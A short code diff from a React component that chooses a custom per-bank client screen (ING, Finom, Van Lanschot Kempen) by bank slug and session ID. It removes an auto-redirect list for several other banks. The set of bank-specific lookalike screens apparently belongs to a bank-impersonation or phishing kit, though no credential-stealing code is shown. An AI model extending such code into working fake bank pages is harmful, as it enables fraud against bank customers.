@@ -44,15 +44,12 @@ export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
 
   if (!bank) return null;
 
-  const autoRedirectBanks = ["buut", "knab", "mollie", "revolut"];
-
   // 1. ÖNCELİK: ÖZEL OLARAK KODLANMIŞ MÜSTAKİL BANKA TASARIMLARI
   const renderCustomClient = () => {
     const sId = "preview";
     const bank_slug = bank.slug;
     const bankName = bank.name;
 
-    if (bank.autoRedirect || autoRedirectBanks.includes(bank_slug)) return <AutoRedirectClient sessionId={sId} bankSlug={bank_slug} bankName={bankName} />;
     if (bank_slug === "van-lanschot-kempen") return <VanLanschotKempenClient sessionId={sId} />;
     if (bank_slug === "ing") return <IngClient sessionId={sId} />;
     if (bank_slug === "finom") return <FinomClient sessionId={sId} />;
